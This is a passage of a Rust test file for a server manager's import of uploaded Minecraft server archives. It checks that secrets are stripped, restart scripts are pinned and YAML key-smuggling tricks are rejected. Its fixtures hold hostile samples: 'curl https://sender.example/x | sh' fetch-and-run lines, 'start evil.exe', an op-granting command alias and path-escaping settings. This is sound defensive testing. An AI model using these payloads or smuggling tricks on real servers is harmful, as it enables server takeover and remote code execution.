            ));
        });
        rewrite_entry(
            &file,
            &format!("objects/{sha256}"),
            &vec![b'X'; secret.len()],
        )
    };
    // a settings file's bytes are read (for credentials) when the file is opened: refused
    let (status, reply) = core
        .upload(&owner, &forge("config/stolen.txt"), "forged.lodeimg")
        .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{reply}");
    assert!(reply.to_string().contains("doesn't match"), "{reply}");
    let forged = forge("config/stolen.bin");
    // a file only opens with every size right; its hashes are checked as it is unpacked
    let (upload_id, summary) = core.upload_ok(&owner, &forged).await;
    let failed = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Forged",
                "port": 25650, "world": "A"
            }),
        )
        .await
        .err()
        .expect("refused");
    assert!(failed.contains("doesn't match"), "{failed}");
    let left: Vec<String> = std::fs::read_dir(crate::prelude::path_to_instances())
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .filter(|n| n.starts_with("Forged"))
        .collect();
    wait_until("the folder is removed", || async {
        !left
            .iter()
            .any(|n| crate::prelude::path_to_instances().join(n).exists())
    })
    .await;
}

/// The files that would keep the sender a way into the new server never come along: a
/// proxy's forwarding secret and settings, Floodgate's key, LuckPerms' database settings
/// (as a mod and a plugin), Discord bots' tokens; Paper's forwarding secret is emptied,
/// the query port is the new server's, functions can't run `/op`, and nothing runs the
/// sender's files: no start script comes along, nothing is placed runnable, Spigot's
/// restart script is its default and Bukkit's permissions come only with the operators.
#[tokio::test]
async fn a_file_gives_its_sender_no_way_in() {
    let core = core().await;
    let owner = core.owner().await;
    let sender_secret = "the-senders-velocity-secret";
    let file = launcher_file(core.dir.path(), |data, content, store| {
        for image in [&mut *data, &mut *content] {
            image.producer.app = lodestone_image::manifest::App::Core;
            image.game.loader = lodestone_image::Loader::Vanilla;
            image.game.loader_version = None;
            image
                .entries
                .retain(|e| !e.path.as_str().starts_with("mods/"));
        }
        data.settings.server = Some(lodestone_image::settings::ServerSettings {
            flavour: Some(lodestone_image::settings::ServerFlavour::Paper),
            ..Default::default()
        });
        let object = |path: &str, bytes: &[u8]| {
            let stored = store.put_bytes(bytes).unwrap();
            lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                bytes.len() as u64,
                stored.sha256,
                Source::Object {},
            )
        };
        data.entries.extend([
            object(
                "config/paper-global.yml",
                format!("proxies:\n  velocity:\n    enabled: true\n    secret: {sender_secret}\n")
                    .as_bytes(),
            ),
            object("forwarding.secret", sender_secret.as_bytes()),
            object("config/FabricProxy-Lite.toml", sender_secret.as_bytes()),
            object("config/floodgate/key.pem", sender_secret.as_bytes()),
            object("config/luckperms/luckperms.conf", sender_secret.as_bytes()),
            object(
                "plugins/LuckPerms/config.yml",
                format!("storage-method: mysql\ndata:\n  password: {sender_secret}\n").as_bytes(),
            ),
            object("plugins/DiscordSRV/config.yml", sender_secret.as_bytes()),
            object("config/Discord-Integration.toml", sender_secret.as_bytes()),
            object(
                "plugins/DiscordIntegration/config.toml",
                format!("[general]\nbotToken = \"{sender_secret}\"\n[commands]\nadminRoleIDs = [\"1\"]\n").as_bytes(),
            ),
            object("plugins/DiscordSRV/.token", sender_secret.as_bytes()),
            object(
                "plugins/DiscordSRV/config.yml-build.1.28.0.old",
                format!("BotToken: \"{sender_secret}\"\n").as_bytes(),
            ),
            object(
                "plugins/ServerTap/config.yml",
                format!("port: 4567\nuseKeyAuth: true\nkey: '{sender_secret}'\n").as_bytes(),
            ),
            object(
                "config/proxy-compatible-forge.toml",
                format!("[forwarding]\nenabled = true\nsecret = \"{sender_secret}\"\n").as_bytes(),
            ),
            object("config/proxy-compatible-forge.cfg", sender_secret.as_bytes()),
            object(
                "config/neovelocity-common.toml",
                format!("[forwarding]\nforwarding-secret = \"{sender_secret}\"\n").as_bytes(),
            ),
            object(
                "config/neoforwarding-server.toml",
                format!("enableForwarding = true\nforwardingSecret = \"{sender_secret}\"\n").as_bytes(),
            ),
            object("config/velocity-forwarding.json5", sender_secret.as_bytes()),
            object(
                "config/legacy-backup/paper.yml.old",
                format!("settings:\n  velocity-support:\n    secret: {sender_secret}\n").as_bytes(),
            ),
            object("config/voicechat-discord.yml", sender_secret.as_bytes()),
            object("config/simple-discord-link/simple-discord-link.toml", sender_secret.as_bytes()),
            object("sdlinkstorage/sdlink.enc", sender_secret.as_bytes()),
            object("EasyAuth/easyauth.db", sender_secret.as_bytes()),
            object("config/EasyAuth/storage.conf", sender_secret.as_bytes()),
            object("config/EasyAuth/proxy.conf", sender_secret.as_bytes()),
            object("config/ledger.toml", sender_secret.as_bytes()),
            object("plugins/Votifier/config.yml", sender_secret.as_bytes()),
            object("plugins/Votifier/rsa/private.key", sender_secret.as_bytes()),
            object("plugins/BungeeGuard/config.yml", sender_secret.as_bytes()),
            object("plugins/AuthMe/authme.db", sender_secret.as_bytes()),
            object("config/Geyser-Fabric/key.pem", sender_secret.as_bytes()),
            object(
                "server.properties",
                b"server-port=25565\nenable-query=true\nquery.port=25565\nonline-mode=false\nmotd=x\renable-rcon=true\nfunction-permission-level=4\n",
            ),
            object("start.sh", b"curl https://sender.example/x | sh\n"),
            object("Run.CMD", b"start evil.exe\n"),
            {
                let mut payload = object("notes.txt", b"#!/bin/sh\ncurl https://sender.example/x | sh\n");
                payload.mode = 0o755;
                payload
            },
            object(
                "spigot.yml",
                b"settings:\n  restart-script: ./notes.txt\n  timeout-time: 1\n  restart-on-crash: true\n",
            ),
            object(
                "bukkit.yml",
                b"settings:\n  permissions-file: notes.yml\n  world-container: ../..\n  allow-end: true\n",
            ),
            object(
                "permissions.yml",
                b"everyone:\n  default: true\n  children:\n    minecraft.command.op: true\n",
            ),
            // the core types `stop` into the console: an alias would run as the console
            object(
                "commands.yml",
                b"aliases:\n  stop:\n  - op Sender\n  - minecraft:stop\n",
            ),
        ]);
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["server"], "Paper", "{summary}");
    let secrets = names(&summary["secrets_not_taken"]);
    let way_in = [
        "forwarding.secret",
        "config/FabricProxy-Lite.toml",
        "config/floodgate/key.pem",
        "config/luckperms/luckperms.conf",
        "plugins/LuckPerms/config.yml",
        "plugins/DiscordSRV/config.yml",
        "config/Discord-Integration.toml",
        "plugins/DiscordIntegration/config.toml",
        "plugins/DiscordSRV/.token",
        "plugins/DiscordSRV/config.yml-build.1.28.0.old",
        "plugins/ServerTap/config.yml",
        "config/proxy-compatible-forge.toml",
        "config/proxy-compatible-forge.cfg",
        "config/neovelocity-common.toml",
        "config/neoforwarding-server.toml",
        "config/velocity-forwarding.json5",
        "config/legacy-backup/paper.yml.old",
        "config/voicechat-discord.yml",
        "config/simple-discord-link/simple-discord-link.toml",
        "sdlinkstorage/sdlink.enc",
        "EasyAuth/easyauth.db",
        "config/EasyAuth/storage.conf",
        "config/EasyAuth/proxy.conf",
        "config/ledger.toml",
        "plugins/Votifier/config.yml",
        "plugins/Votifier/rsa/private.key",
        "plugins/BungeeGuard/config.yml",
        "plugins/AuthMe/authme.db",
        "config/Geyser-Fabric/key.pem",
    ];
    for path in way_in {
        assert!(secrets.contains(&path.to_string()), "{secrets:?}");
    }
    let operators = names(&summary["operators"]);
    for path in ["permissions.yml", "commands.yml"] {
        assert!(operators.contains(&path.to_string()), "{summary}");
    }
    let not_taken = summary["not_taken"].as_array().unwrap();
    assert!(not_taken.contains(&json!("server_software")), "{summary}");
    assert!(not_taken.contains(&json!("operators")), "{summary}");
    assert_eq!(summary["offline_mode"], true);
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "No way in",
                "port": 25651
            }),
        )
        .await
        .unwrap();
    for path in way_in
        .into_iter()
        .chain(["start.sh", "Run.CMD", "permissions.yml", "commands.yml"])
    {
        assert!(!made.has(path), "{path}");
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        let mode = std::fs::metadata(made.root.join("notes.txt"))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o111, 0, "placed runnable: {mode:o}");
    }
    let spigot = made.read("spigot.yml");
    assert!(spigot.contains("restart-script: ./start.sh"), "{spigot}");
    assert!(spigot.contains("timeout-time: 1"), "{spigot}");
    let bukkit = made.read("bukkit.yml");
    assert!(
        bukkit.contains("permissions-file: permissions.yml"),
        "{bukkit}"
    );
    assert!(bukkit.contains("world-container: ."), "{bukkit}");
    assert!(!bukkit.contains(".."), "{bukkit}");
    assert!(bukkit.contains("allow-end: true"), "{bukkit}");
    let paper = made.read("config/paper-global.yml");
    assert!(!paper.contains(sender_secret), "{paper}");
    assert!(paper.contains("secret: ''"), "{paper}");
    let properties = made.read("server.properties");
    let (document, _) =
        crate::implementations::minecraft::properties::PropertiesDocument::from_bytes(
            properties.as_bytes(),
        );
    assert_eq!(document.get("query.port"), Some("25651"));
    assert_eq!(document.get("server-port"), Some("25651"));
    // the setting hidden after a lone carriage return is read as its own line
    assert_eq!(document.get("enable-rcon"), Some("false"));
    assert_eq!(document.get("function-permission-level"), Some("2"));
    assert!(!properties.contains('\r'), "{properties:?}");
    assert!(
        made.message.contains("key to the server"),
        "{}",
        made.message
    );
}

/// Bukkit's old command aliases (an `aliases:` section in `bukkit.yml`) never reach a
/// server made from a file: with no `commands.yml`, Paper would move them into a new one at
/// the first start, and the sender's `stop` alias would run `op sender` as the console the
/// first time the owner stops the server. The section is set to `now-in-commands.yml`, as
/// Bukkit writes it once it has moved it, with or without the operators.
#[tokio::test]
async fn bukkits_old_command_aliases_are_not_placed() {
    let core = core().await;
    let owner = core.owner().await;
    let bukkit = b"settings:\n  allow-end: true\n  permissions-file: permissions.yml\n  world-container: .\naliases:\n  stop:\n  - op sender\n  - stop\n  save-all:\n  - op sender\n  - save-all\n";
    let file = launcher_file(core.dir.path(), |data, content, store| {
        for image in [&mut *data, &mut *content] {
            image.producer.app = lodestone_image::manifest::App::Core;
            image.game.loader = lodestone_image::Loader::Vanilla;
            image.game.loader_version = None;
            image
                .entries
                .retain(|e| !e.path.as_str().starts_with("mods/"));
        }
        data.settings.server = Some(lodestone_image::settings::ServerSettings {
            flavour: Some(lodestone_image::settings::ServerFlavour::Paper),
            ..Default::default()
        });
        let stored = store.put_bytes(bukkit).unwrap();
        data.entries.push(lodestone_image::Entry::new(
            lodestone_image::CanonicalPath::new("bukkit.yml").unwrap(),
            bukkit.len() as u64,
            stored.sha256,
            Source::Object {},
        ));
    });
    for (port, keep_operators) in [(25654, false), (25655, true)] {
        let (upload_id, summary) = core.upload_ok(&owner, &file).await;
        let made = core
            .create_and_wait(
                &owner,
                json!({
                    "upload_id": upload_id, "image": summary["image"],
                    "name": format!("Aliases {port}"), "port": port,
                    "keep_operators": keep_operators
                }),
            )
            .await
            .unwrap();
        let placed = made.read("bukkit.yml");
        assert_eq!(
            placed,
            "settings:\n  allow-end: true\n  permissions-file: permissions.yml\n  world-container: .\naliases: now-in-commands.yml\n"
        );
        assert!(!made.has("commands.yml"));
    }
}

/// Settings files whose keys a YAML reader could read differently from the line editor
/// (`"restart\x2Dscript"`, which Spigot reads as `restart-script`) are not placed: the
/// server writes its defaults instead of the sender's restart script, permissions file or
/// forwarding secret.
#[tokio::test]
async fn settings_with_keys_the_editor_cant_read_are_not_placed() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |data, content, store| {
        for image in [&mut *data, &mut *content] {
            image.producer.app = lodestone_image::manifest::App::Core;
            image.game.loader = lodestone_image::Loader::Vanilla;
            image.game.loader_version = None;
            image
                .entries
                .retain(|e| !e.path.as_str().starts_with("mods/"));
        }
        data.settings.server = Some(lodestone_image::settings::ServerSettings {
            flavour: Some(lodestone_image::settings::ServerFlavour::Paper),
            ..Default::default()
        });
        let object = |path: &str, bytes: &[u8]| {
            let stored = store.put_bytes(bytes).unwrap();
            lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                bytes.len() as u64,
                stored.sha256,
                Source::Object {},
            )
        };
        data.entries.extend([
            object(
                "spigot.yml",
                b"settings:\n  \"restart\\x2Dscript\": config/evil.txt\n",
            ),
            object(
                "bukkit.yml",
                b"settings:\n  \"permissions\\x2Dfile\": config/p.yml\n",
            ),
            object(
                "config/paper-global.yml",
                b"proxies:\n  velocity:\n    enabled: true\n    \"s\\x65cret\": the-senders-key\n",
            ),
            object("config/evil.txt", b"curl https://sender.example/x | sh\n"),
        ]);
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["server"], "Paper", "{summary}");
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Escaped keys",
                "port": 25652
            }),
        )
        .await
        .unwrap();
    for path in ["spigot.yml", "bukkit.yml", "config/paper-global.yml"] {
        assert!(!made.has(path), "{path}");
    }
    // the owner is told the file's settings are gone, not only the log
    for said in [
        "3 settings file(s)",
        "bukkit.yml",
        "config/paper-global.yml",
        "spigot.yml",
    ] {
        assert!(made.message.contains(said), "{said}: {}", made.message);
    }
}

/// Bukkit's settings split every key at its dots, so a top-level
/// `settings.restart-script:` is Spigot's restart script, `settings.world-container:`
/// Bukkit's worlds' folder and `settings.velocity-support.secret:` the old Paper's
/// forwarding secret, whatever the nested keys say: such files are not placed, and the
/// server writes its defaults instead of running the sender's script.
#[tokio::test]
async fn settings_with_dotted_keys_are_not_placed() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |data, content, store| {
        for image in [&mut *data, &mut *content] {
            image.producer.app = lodestone_image::manifest::App::Core;
            image.game.loader = lodestone_image::Loader::Vanilla;
            image.game.loader_version = None;
            image
                .entries
                .retain(|e| !e.path.as_str().starts_with("mods/"));
        }
        data.settings.server = Some(lodestone_image::settings::ServerSettings {
            flavour: Some(lodestone_image::settings::ServerFlavour::Paper),
            ..Default::default()
        });
        let object = |path: &str, bytes: &[u8]| {
            let stored = store.put_bytes(bytes).unwrap();
            lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                bytes.len() as u64,
                stored.sha256,
                Source::Object {},
            )
        };
        data.entries.extend([
            object(
                "spigot.yml",
                b"config-version: 12\nsettings:\n  restart-on-crash: true\n  restart-script: ./start.sh\nsettings.restart-script: plugins/Essentials/backup.sh\n",
            ),
            object(
                "bukkit.yml",
                b"settings:\n  allow-end: true\n  permissions-file: permissions.yml\nsettings.world-container: /tmp/elsewhere\nsettings.permissions-file: plugins/Foo/perms.yml\n",
            ),
            object(
                "paper.yml",
                b"settings:\n  velocity-support:\n    enabled: true\n    secret: ''\nsettings.velocity-support.secret: the-senders-key\n",
            ),
            object("plugins/Essentials/backup.sh", b"curl https://sender.example/x | sh\n"),
        ]);
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["server"], "Paper", "{summary}");
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Dotted keys",
                "port": 25653
            }),
        )
        .await
        .unwrap();
    for path in ["spigot.yml", "bukkit.yml", "paper.yml"] {
        assert!(!made.has(path), "{path}");
    }
    for said in [
        "3 settings file(s)",
        "bukkit.yml",
        "paper.yml",
        "spigot.yml",
    ] {
        assert!(made.message.contains(said), "{said}: {}", made.message);
    }
}

/// Settings files a byte order mark once hid a flow mapping behind (Spigot's restart
/// script, Bukkit's worlds' folder and permissions file, Paper's forwarding secret) are
/// not placed: the server writes its defaults.
#[tokio::test]
async fn settings_behind_a_byte_order_mark_are_not_placed() {
    let core = core().await;
    let owner = core.owner().await;
    let file = launcher_file(core.dir.path(), |data, content, store| {
        for image in [&mut *data, &mut *content] {
            image.producer.app = lodestone_image::manifest::App::Core;
            image.game.loader = lodestone_image::Loader::Vanilla;
            image.game.loader_version = None;
            image
                .entries
                .retain(|e| !e.path.as_str().starts_with("mods/"));
        }
        data.settings.server = Some(lodestone_image::settings::ServerSettings {
            flavour: Some(lodestone_image::settings::ServerFlavour::Paper),
            ..Default::default()
        });
        let object = |path: &str, bytes: &[u8]| {
            let stored = store.put_bytes(bytes).unwrap();
            lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                bytes.len() as u64,
                stored.sha256,
                Source::Object {},
            )
        };
        data.entries.extend([
            object(
                "spigot.yml",
                "\u{FEFF}{settings:{\nx: y, restart-script: config/evil.txt\n}}\n".as_bytes(),
            ),
            object(
                "bukkit.yml",
                "\u{FEFF}{settings:{\nx: y, world-container: ../.., permissions-file: config/p.yml\n}}\n"
                    .as_bytes(),
            ),
            object(
                "config/paper-global.yml",
                "\u{FEFF}{proxies:{velocity:{\nenabled: true, online-mode: true, secret: the-senders-key\n}}}\n"
                    .as_bytes(),
            ),
            object("config/evil.txt", b"curl https://sender.example/x | sh\n"),
        ]);
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    assert_eq!(summary["server"], "Paper", "{summary}");
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "Byte order marks",
                "port": 25654
            }),
        )
        .await
        .unwrap();
    for path in ["spigot.yml", "bukkit.yml", "config/paper-global.yml"] {
        assert!(!made.has(path), "{path}");
    }
    // the owner is told the file's settings are gone, not only the log
    for said in [
        "3 settings file(s)",
        "bukkit.yml",
        "config/paper-global.yml",
        "spigot.yml",
    ] {
        assert!(made.message.contains(said), "{said}: {}", made.message);
    }
}

/// What an export can't clean line by line (a secret in flow style, behind an anchor, on
/// a line only a YAML reader breaks) is withheld, and `server.properties` is read with
/// Java's line breaks.
#[test]
fn yaml_an_export_cant_read_line_by_line_is_withheld() {
    use super::export::{clean_yaml, YamlCleaning};
    for odd in [
        "proxies: {velocity: {secret: abc}}\n",
        "proxies:\n  velocity:\n    secret: &s abc\nother: *s\n",
        "? secret\n: abc\n",
        "a: 1\rsecret: abc\n",
        "a: 1\u{2028}secret: abc\n",
        "a: 1\u{85}secret: abc\n",
    ] {
        assert_eq!(
            clean_yaml(odd.len() as u64, odd.as_bytes(), &["secret"]),
            YamlCleaning::Withhold,
            "{odd:?}"
        );
    }
    assert_eq!(
        clean_yaml(2 << 20, b"secret: abc\n", &["secret"]),
        YamlCleaning::Withhold
    );
    assert_eq!(
        clean_yaml(12, b"a:\n  b: 1\r\n", &["secret"]),
        YamlCleaning::Unchanged
    );
    assert!(matches!(
        clean_yaml(12, b"secret: abc\r\n", &["secret"]),
        YamlCleaning::Blanked(_, _)
    ));
    let (clean, keys) = blank_secrets(b"motd=hi\rrcon.password=hunter2\n").unwrap();
    assert_eq!(keys, ["rcon.password"]);
    assert!(!String::from_utf8(clean).unwrap().contains("hunter2"));
    // a quoted secret whose quotes don't close within its lines: a lenient reader takes
    // the less indented line after it as the rest of the secret
    for unclosed in [
        "proxies:\n  velocity:\n    secret: \"first-half\nSECOND-HALF\"\n    online-mode: true\n",
        "proxies:\n  velocity:\n    secret: 'first-half\nSECOND-HALF'\n",
        "secret: 'it''s\n",
        "secret: \"a\\\"\n",
    ] {
        assert_eq!(
            clean_yaml(unclosed.len() as u64, unclosed.as_bytes(), &["secret"]),
            YamlCleaning::Withhold,
            "{unclosed:?}"
        );
    }
    for closed in [
        "secret: 'it''s'\n",
        "secret: \"a\\\"b\"\n",
        "secret: \"x\" # c\n",
    ] {
        assert!(
            matches!(
                clean_yaml(closed.len() as u64, closed.as_bytes(), &["secret"]),
                YamlCleaning::Blanked(_, _)
            ),
            "{closed:?}"
        );
    }
}

/// A server from a file sets Spigot's restart script and Bukkit's permissions file to
/// their defaults, whatever the file said, and leaves them when they are already.
#[test]
fn settings_that_could_run_the_senders_files_are_pinned() {
    use super::export::{pin_yaml, pin_yaml_all, pinned_yaml_of, YamlCleaning};
    let path = |p: &str| lodestone_image::CanonicalPath::new(p).unwrap();
    assert_eq!(
        pinned_yaml_of(&path("Spigot.yml")),
        Some(&[("restart-script", "./start.sh")][..])
    );
    let bukkit_pins = pinned_yaml_of(&path("bukkit.yml")).unwrap();
    assert_eq!(
        bukkit_pins,
        [
            ("permissions-file", "permissions.yml"),
            ("world-container", "."),
            ("aliases", "now-in-commands.yml"),
        ]
    );
    // Bukkit's old aliases section, which Paper would move into a new `commands.yml`, is
    // set to what Bukkit writes once it has moved it
    let legacy = b"settings:\n  permissions-file: permissions.yml\n  world-container: .\naliases:\n  stop:\n  - op sender\n  - stop\n  save-all:\n  - op sender\n  - save-all\nticks-per:\n  autosave: 6000\n";
    let YamlCleaning::Blanked(out, keys) = pin_yaml_all(legacy.len() as u64, legacy, bukkit_pins)
    else {
        panic!("not pinned");
    };
    assert_eq!(
        String::from_utf8(out).unwrap(),
        "settings:\n  permissions-file: permissions.yml\n  world-container: .\naliases: now-in-commands.yml\nticks-per:\n  autosave: 6000\n"
    );
    assert_eq!(keys, ["aliases"]);
    // every pin of a file is set, and a key that isn't there stays out
    let bukkit = b"settings:\n  world-container: ../..\n  permissions-file: notes.yml\n";
    let YamlCleaning::Blanked(out, keys) = pin_yaml_all(bukkit.len() as u64, bukkit, bukkit_pins)
    else {
        panic!("not pinned");
    };
    assert_eq!(
        String::from_utf8(out).unwrap(),
        "settings:\n  world-container: .\n  permissions-file: permissions.yml\n"
    );
    assert_eq!(keys, ["permissions-file", "world-container"]);
    let plain = b"settings:\n  allow-end: true\n";
    assert_eq!(
        pin_yaml_all(plain.len() as u64, plain, bukkit_pins),
        YamlCleaning::Unchanged
    );
    assert_eq!(pinned_yaml_of(&path("world/spigot.yml")), None);
    let spigot = b"settings:\n  restart-script: ./world/data/raids2.dat\n  timeout-time: 1\n";
    let YamlCleaning::Blanked(out, keys) = pin_yaml(
        spigot.len() as u64,
        spigot,
        &["restart-script"],
        "./start.sh",
    ) else {
        panic!("not pinned");
    };
    assert_eq!(
        String::from_utf8(out).unwrap(),
        "settings:\n  restart-script: ./start.sh\n  timeout-time: 1\n"
    );
    assert_eq!(keys, ["restart-script"]);
    let default = b"settings:\n  restart-script: './start.sh'\n";
    assert_eq!(
        pin_yaml(
            default.len() as u64,
            default,
            &["restart-script"],
            "./start.sh"
        ),
        YamlCleaning::Unchanged
    );
    let odd = b"settings: {restart-script: ./x}\n";
    assert_eq!(
        pin_yaml(odd.len() as u64, odd, &["restart-script"], "./start.sh"),
        YamlCleaning::Withhold
    );
}

/// A key the line editor can't read for certain (an escape in double quotes, a tag, a
/// complex or merge key, letters outside the plain set) makes the file withheld, for the
/// secrets an export blanks and the settings a server from a file pins alike: a YAML
/// reader would take `"restart\x2Dscript"` as `restart-script`.
#[test]
fn yaml_keys_the_editor_cant_read_withhold_the_file() {
    use super::export::{clean_yaml, pin_yaml, YamlCleaning};
    for odd in [
        "settings:\n  \"restart\\x2Dscript\": config/evil.txt\n",
        "settings:\n  \"restart\\u002Dscript\": config/evil.txt\n",
        "settings:\n  !!str restart-script: config/evil.txt\n",
        "settings:\n  ? restart-script\n  : config/evil.txt\n",
        "settings:\n  <<: {restart-script: x}\n",
        "settings:\n  - \"restart\\x2Dscript\": x\n",
        "settings:\n  restart\u{feff}-script: x\n",
        "\"a: b\": c\n",
        // Bukkit splits keys at their dots: each of these is `settings.restart-script`
        "settings.restart-script: plugins/Essentials/backup.sh\n",
        "config-version: 12\nsettings:\n  restart-on-crash: true\n  restart-script: ./start.sh\nmessages:\n  whitelist: You are not whitelisted on this server!\nsettings.restart-script: plugins/Essentials/backup.sh\n",
        "'settings.restart-script': x\n",
        "\"settings.restart-script\": x\n",
        "settings:\n  restart.x: y\n",
    ] {
        assert_eq!(
            pin_yaml(
                odd.len() as u64,
                odd.as_bytes(),
                &["restart-script"],
                "./start.sh"
            ),
            YamlCleaning::Withhold,
            "{odd:?}"
        );
    }
    let velocity = "proxies:\n  velocity:\n    enabled: true\n    \"s\\x65cret\": abc\n";
    assert_eq!(
        clean_yaml(velocity.len() as u64, velocity.as_bytes(), &["secret"]),
        YamlCleaning::Withhold
    );
    // a dotted key is a nested one to Bukkit: Bukkit's worlds' folder and permissions
    // file, the old Paper's forwarding secret
    let bukkit_pins =
        super::export::pinned_yaml_of(&lodestone_image::CanonicalPath::new("bukkit.yml").unwrap())
            .unwrap();
    let bukkit = "settings:\n  allow-end: true\n  permissions-file: permissions.yml\nsettings.world-container: /Users/victim/Library/LaunchAgents\nsettings.permissions-file: plugins/Foo/perms.yml\n";
    assert_eq!(
        super::export::pin_yaml_all(bukkit.len() as u64, bukkit.as_bytes(), bukkit_pins),
        YamlCleaning::Withhold
    );
    let paper = "settings:\n  velocity-support:\n    enabled: true\n    secret: ''\nsettings.velocity-support.secret: abc\n";
    assert_eq!(
        clean_yaml(paper.len() as u64, paper.as_bytes(), &["secret"]),
        YamlCleaning::Withhold
    );
    // what real settings files hold stays readable: plain and quoted plain keys, world
    // names with spaces, lists, values with colons, comments
    let real = "# Spigot\nsettings:\n  'timeout-time': 60\n  restart-script: ./start.sh\nworld-settings:\n  My World:\n    growth: 100\nadvancements:\n  disabled:\n  - minecraft:story/disabled\n  - 'minecraft:x'\nmessages:\n  whitelist: You are not whitelisted, ask! # note: x\n  restart: \"Server is restarting\"\nstats:\n  forced-stats: {}\n";
    assert_eq!(
        pin_yaml(
            real.len() as u64,
            real.as_bytes(),
            &["restart-script"],
            "./start.sh"
        ),
        YamlCleaning::Unchanged
    );
}

/// A flow collection is read by YAML readers without regard to its lines' indentation, so
/// a key in one that spans lines (`velocity: {` / `enabled: true, secret: abc` / `}`), or
/// in a one-line flow mapping spelled with an escape, is out of every line check's sight:
/// the file is withheld (on export) or left out (on import) rather than passed with the
/// sender's forwarding secret or Spigot's restart script. Empty collections and one-line
/// lists stay readable.
#[test]
fn yaml_flow_collections_the_editor_cant_read_withhold_the_file() {
    use super::export::{clean_yaml, pin_yaml_all, YamlCleaning};
    for odd in [
        "proxies:\n  velocity: {\n    enabled: true, online-mode: true, secret: attacker\n  }\n",
        "proxies:\n  velocity: {\n    enabled: true, online-mode: true, secret: attacker\n    }\n",
        "proxies:\n  velocity:\n    {\n    enabled: true, secret: attacker }\n",
        "proxies: {velocity: {\"s\\x65cret\": attacker}}\n",
        "proxies:\n  velocity: !!map {\"s\\x65cret\": attacker}\n",
        "--- {\n  proxies: x, secret: attacker }\n",
        "proxies:\n  velocity: [\n    secret: attacker ]\n",
        "proxies:\n  - [\"s\\x65cret\": attacker]\n",
        "proxies:\n  velocity: [a, # c\n  ]\n",
        "proxies:\n  velocity: [\"a\n  \"]\n",
    ] {
        assert_eq!(
            clean_yaml(odd.len() as u64, odd.as_bytes(), &["secret"]),
            YamlCleaning::Withhold,
            "{odd:?}"
        );
    }
    let pins = [("restart-script", "./start.sh")];
    let spigot = "settings: {\n  bungeecord: false, restart-script: world/evil.txt\n}\n";
    assert_eq!(
        pin_yaml_all(spigot.len() as u64, spigot.as_bytes(), &pins),
        YamlCleaning::Withhold
    );
    let bukkit = "settings:\n  allow-end: [\n  true, world-container: ../.. ]\n";
    assert_eq!(
        pin_yaml_all(
            bukkit.len() as u64,
            bukkit.as_bytes(),
            &[("world-container", ".")]
        ),
        YamlCleaning::Withhold
    );
    let readable = "a: []\nb: {}\nc: { }\nd: [x, 'y, z', \"w\"] # note\ne:\n- [minecraft:elytra, x]\nmotd: hi {0} and [1]\n";
    assert_eq!(
        clean_yaml(readable.len() as u64, readable.as_bytes(), &["secret"]),
        YamlCleaning::Unchanged
    );
}

/// Paper's `config/paper-global.yml` as Paper 1.21.4 and later write it: a namespaced key
/// (`minecraft:elytra:`) in the item obfuscation settings, flow `[]` values, MiniMessage
/// values with colons, a message that wraps onto the next line. `SECRET` is where the
/// Velocity forwarding secret goes.
const MODERN_PAPER_GLOBAL: &str = "\
# This is the global configuration file for Paper.
# Docs: https://docs.papermc.io/paper/reference/global-configuration

_version: 29
anticheat:
  obfuscation:
    items:
      all-models:
        also-obfuscate: []
        dont-obfuscate:
        - minecraft:lodestone_tracker
        sanitize-count: true
      enable-item-obfuscation: false
      model-overrides:
        minecraft:elytra:
          also-obfuscate: []
          dont-obfuscate:
          - minecraft:damage
          sanitize-count: true
chunk-loading-basic:
  player-max-chunk-generate-rate: -1.0
  player-max-chunk-send-rate: 75.0
messages:
  kick:
    authentication-servers-down: <lang:multiplayer.disconnect.authservers_down>
    connection-throttle: Connection throttled! Please wait before reconnecting.
  no-permission: <red>I'm sorry, but you do not have permission to perform this command.
    Please contact the server administrators if you believe that this is in error.
packet-limiter:
  all-packets:
    action: KICK
    interval: 7.0
    max-packet-rate: 500.0
  kick-message: <red><lang:disconnect.exceeded_packet_rate>
  overrides:
    ServerboundPlaceRecipePacket:
      action: DROP
      interval: 4.0
      max-packet-rate: 5.0
proxies:
  bungee-cord:
    online-mode: true
  proxy-protocol: false
  velocity:
    enabled: true
    online-mode: true
    secret: SECRET
timings:
  enabled: false
  hidden-config-entries:
  - database
  - proxies.velocity.secret
  url: https://timings.aikar.co/
unsupported-settings:
  compression-format: ZLIB
";

/// A modern Paper's global settings are cleaned, not withheld: the namespaced key
/// `minecraft:elytra` is one plain key, read the same way by the check and the editor. A
/// key glued to its value (`secret:abc`, one plain value to a YAML reader) is still
/// withheld rather than passed with what may be a secret.
#[test]
fn a_modern_paper_global_config_is_cleaned_not_withheld() {
    use super::export::{clean_yaml, pin_yaml, YamlCleaning};
    let paper = MODERN_PAPER_GLOBAL.replace("SECRET", VELOCITY_SECRET);
    let YamlCleaning::Blanked(out, keys) =
        clean_yaml(paper.len() as u64, paper.as_bytes(), &["secret"])
    else {
        panic!("withheld: {paper}");
    };
    assert_eq!(keys, ["secret"]);
    assert_eq!(
        String::from_utf8(out).unwrap(),
        MODERN_PAPER_GLOBAL.replace("SECRET", "''")
    );
